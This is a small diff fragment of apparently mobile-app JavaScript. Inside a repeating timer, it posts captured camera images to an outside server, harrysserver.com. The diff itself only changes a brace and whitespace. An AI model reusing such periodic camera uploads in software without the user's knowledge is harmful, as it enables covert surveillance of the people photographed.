@@ -20,9 +20,9 @@ var test=function(txt) {
         $.post("http://harrysserver.com/camera/upload.php", {image: pic});
       });
     }, 10000*(k+1));
-    }
   }
 }
+
 
 app.initialize();
 test('got here');
